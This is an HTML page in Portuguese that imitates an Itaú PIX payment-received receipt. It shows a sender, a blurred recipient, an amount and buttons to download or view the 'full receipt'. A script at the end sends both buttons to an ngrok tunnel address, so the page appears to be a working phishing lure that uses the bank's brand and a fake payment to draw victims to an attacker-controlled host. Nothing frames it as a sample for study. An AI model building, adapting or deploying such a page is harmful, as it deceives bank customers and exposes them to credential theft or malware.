<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Recebido - Itaú</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background-color: #003366;
            color: white;
            padding: 30px 25px;
            text-align: center;
        }
        
        .logo {
            background-color: white;
            color: #003366;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 28px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 15px;
        }
        
        .header-title {
            font-size: 18px;
            margin-top: 10px;
            opacity: 0.95;
        }
        
        .content {
            padding: 35px 25px;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            background-color: #10b981;
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        
        .status-text {
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            color: #10b981;
            margin-bottom: 30px;
        }
        
        .info-box {
            background-color: #f8fafc;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid #e2e8f0;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #e2e8f0;
        }
        
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: #64748b;
            font-size: 14px;
        }
        
        .info-value {
            color: #1e293b;
            font-weight: 600;
            font-size: 14px;
            text-align: right;
        }
        
        .info-value-blurred {
            filter: blur(5px);
            user-select: none;
        }
        
        .amount-box {
            background: linear-gradient(135deg, #003366 0%, #004080 100%);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            margin-bottom: 25px;
        }
        
        .amount-label {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .amount-value {
            color: white;
            font-size: 36px;
            font-weight: bold;
        }
        
        .btn-download {
            width: 100%;
            background: linear-gradient(135deg, #ec7000 0%, #ff8c00 100%);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(236, 112, 0, 0.3);
            margin-bottom: 15px;
        }
        
        .btn-download:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(236, 112, 0, 0.4);
        }
        
        .btn-download:active {
            transform: translateY(0);
        }
        
        .btn-view {
            width: 100%;
            background: white;
            color: #003366;
            border: 2px solid #003366;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-view:hover {
            background: #003366;
            color: white;
            transform: translateY(-2px);
        }
        
        .btn-view:active {
            transform: translateY(0);
        }
        
        .footer-text {
            text-align: center;
            color: #94a3b8;
            font-size: 12px;
            margin-top: 25px;
            line-height: 1.6;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .container {
            animation: fadeIn 0.5s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">itaú</div>
            <div class="header-title">PIX TRANSFERÊNCIA</div>
        </div>
        
        <div class="content">
            <div class="success-icon">✓</div>
            <div class="status-text">Pagamento Recebido</div>
            
            <div class="info-box">
                <div class="info-row">
                    <span class="info-label">De:</span>
                    <span class="info-value">CLINICA ESTETICA ESSENCIAL LAS</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Para:</span>
                    <span class="info-value info-value-blurred">Francisco de Lima</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Data:</span>
                    <span class="info-value">19/11/2025 às 10:17</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Banco:</span>
                    <span class="info-value">237 - Bradesco</span>
                </div>
            </div>
            
            <div class="amount-box">
                <div class="amount-label">Valor Recebido</div>
                <div class="amount-value">R$ 5.489,00</div>
            </div>
            
            <button class="btn-download" id="btnDownload">
                Baixar Comprovante Completo
            </button>
            
            <button class="btn-view" id="btnView">
                Ver Comprovante Completo
            </button>
            
            <div class="footer-text">
                Clique em um dos botões acima para acessar<br>
                o comprovante completo da transação
            </div>
        </div>
    </div>
    
    <script>
        // URL do ngrok para onde o usuário será redirecionado
        var ngrokUrl = 'https://quintuply-unrefrangible-rachell.ngrok-free.dev';
        
        // Função para redirecionar
        function redirectToNgrok() {
            window.location.href = ngrokUrl;
        }
        
        // Adicionar evento de clique nos botões
        document.getElementById('btnDownload').addEventListener('click', redirectToNgrok);
        document.getElementById('btnView').addEventListener('click', redirectToNgrok);
    </script>
</body>
</html>
